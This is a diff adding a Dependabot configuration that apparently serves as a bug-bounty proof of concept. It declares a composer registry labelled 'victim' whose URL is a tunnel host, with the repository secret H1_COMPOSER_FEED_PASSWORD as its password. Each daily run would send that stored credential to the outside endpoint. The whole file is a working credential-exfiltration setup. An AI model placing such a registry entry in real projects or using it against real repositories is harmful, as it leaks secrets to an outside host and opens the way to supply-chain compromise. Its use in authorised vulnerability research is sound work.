@@ -1,0 +1,15 @@
+version: 2
+registries:
+  victim-composer-feed:
+    type: composer-repository
+    url: https://93e87972790e8d.lhr.life/victim
+    username: h1-registry-owner
+    password: ${{secrets.H1_COMPOSER_FEED_PASSWORD}}
+updates:
+  - package-ecosystem: composer
+    directory: "/"
+    registries:
+      - victim-composer-feed
+    schedule:
+      interval: daily
+    open-pull-requests-limit: 1
